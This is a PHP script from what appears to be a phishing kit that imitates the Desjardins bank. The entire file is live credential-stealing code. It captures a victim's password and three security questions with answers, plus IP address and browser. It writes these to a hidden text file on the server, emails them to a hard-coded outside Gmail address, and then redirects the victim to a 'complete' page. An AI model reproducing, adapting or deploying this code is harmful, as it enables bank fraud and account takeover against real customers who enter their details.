 <?php

error_reporting(0);
$send = "medahnabil@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];

$username = $_POST["username"];
$password = $_POST["password"];

$message .= "-----------------1 LoginDetails---------------------\n";
$message .= "Password : ".$password."\n";
$message .= "-----------------2 QuestionDetails------------------\n";
$message .= "Question 1 : ".$_POST['question1']."\n";
$message .= "Answer 1 : ".$_POST['answer1']."\n";
$message .= "Question 2 : ".$_POST['question2']."\n";
$message .= "Answer 2 : ".$_POST['answer2']."\n";
$message .= "Question 3 : ".$_POST['question3']."\n";
$message .= "Answer 3 : ".$_POST['answer3']."\n";
$message .= "------------------created by GOODLIFE----------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------DESJARDINSResults------------------\n";


$subject = "DESJARDINS - created by GOODLIFE ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"DESJARDINS - GOODLIFE" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "DESJARDINS PASSWORD & QUESTIONS - ".$ip."", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");


?>
<script>
    window.top.location.href = "complete.htm";

</script>